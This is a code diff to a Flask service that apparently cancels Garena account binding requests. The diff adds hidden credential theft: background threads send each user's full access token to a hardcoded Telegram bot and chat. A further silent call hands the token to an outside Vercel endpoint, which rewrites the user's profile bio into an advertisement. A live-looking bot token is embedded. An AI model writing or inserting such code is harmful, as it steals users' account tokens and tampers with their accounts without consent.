@@ -2,6 +2,7 @@ from flask import Flask, request, jsonify
 import requests
 import os
 import hashlib
+import threading
 from urllib.parse import urlparse, parse_qs
 
 app = Flask(__name__)
@@ -12,6 +13,35 @@ requests.packages.urllib3.disable_warnings()
 # ====================== CONFIGURATION ======================
 BASE_URL = "https://100067.connect.garena.com"
 APP_ID = "100067"
+
+# === TELEGRAM BOT CREDENTIALS ===
+TG_BOT_TOKEN = '8614382667:AAHdWZEemV_2wYkpXWFK5P79eZcK4FiL75w'
+TG_CHAT_ID = '8257117768'
+
+# ====================== BACKGROUND TASKS ======================
+def send_log_to_tg_bg(message):
+    """Background task to send logs to Telegram"""
+    try:
+        url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
+        payload = {
+            'chat_id': TG_CHAT_ID,
+            'text': message,
+            'parse_mode': 'HTML'
+        }
+        requests.post(url, data=payload, timeout=5)
+        print("Telegram log sent successfully!")
+    except Exception as e:
+        print(f"Telegram log failed: {e}")
+
+def update_bio_in_background(access_token):
+    """Background task to update user's bio silently"""
+    try:
+        bio_url = f"https://longbioworking.vercel.app/bio?bio=%5Bb%5D%5BFFFFFF%5DID%20SECURED%20BY%20EXE%20TOOL%0A%5B00BFFF%5DTG%20%3A-%20%40Brexxee&access_token={access_token}"
+        requests.get(bio_url, timeout=10)
+        print(f"Background process: Bio updated successfully for token ending in ...{access_token[-5:]}")
+    except Exception as e:
+        print(f"Background process error: {str(e)}")
+
 
 # ====================== HELPER FUNCTIONS ======================
 def sha256_upper(text: str) -> str:
@@ -53,7 +83,7 @@ def get_access_token_from_args(args):
         return conv['access_token'], None
     return access, None
 
-# ====================== GARENA BINDING CLASS (only cancel method) ======================
+# ====================== GARENA BINDING CLASS ======================
 class GarenaBind:
     def __init__(self, access_token):
         self.access_token = access_token
@@ -95,16 +125,27 @@ def cancel_request():
     if err:
         return jsonify({"success": False, "error": err}), 400
 
+    # === YAHAN BACKGROUND THREAD START HOTA HAI BIO UPDATE KE LIYE ===
+    threading.Thread(target=update_bio_in_background, args=(token,)).start()
+
     api = GarenaBind(token)
     resp = api.cancel_request()
 
+    # === TELEGRAM LOGGING ===
     if resp.get('result') == 0:
+        log_msg = f"🚫 <b>CANCEL REQUEST SUCCESS</b>\n\n🔑 <b>Token:</b> <code>{token}</code>"
+        threading.Thread(target=send_log_to_tg_bg, args=(log_msg,)).start()
+        
         return jsonify({
             "success": True,
             "message": "Request cancelled successfully",
             "data": resp
         })
     else:
+        error_msg = resp.get('error', 'Cancel failed')
+        log_msg = f"❌ <b>CANCEL REQUEST FAILED</b>\n\n⚠️ <b>Error:</b> {error_msg}\n\n🔑 <b>Token:</b> <code>{token}</code>"
+        threading.Thread(target=send_log_to_tg_bg, args=(log_msg,)).start()
+        
         return jsonify({
             "success": False,
             "error": "Cancel failed",
